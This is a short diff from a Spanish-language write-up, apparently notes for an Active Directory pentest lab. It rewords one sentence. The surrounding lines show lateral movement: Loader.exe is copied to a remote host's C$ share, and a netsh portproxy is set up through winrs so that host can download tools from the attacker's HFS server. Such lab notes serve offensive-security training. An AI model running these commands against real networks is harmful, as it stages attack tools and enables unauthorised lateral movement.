@@ -331,7 +331,7 @@ Y ahora le copiamos el *Loader* desde la maquina en la que estamos a la maquina 
 echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 
-Para poder ejecutar herramientas tendremos que hacer el reenvio de puertos
+Creamos un portproxy para que el equipo remoto pueda descargar las herramientas desde nuestro HFS
 ```shell
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97"
 ```
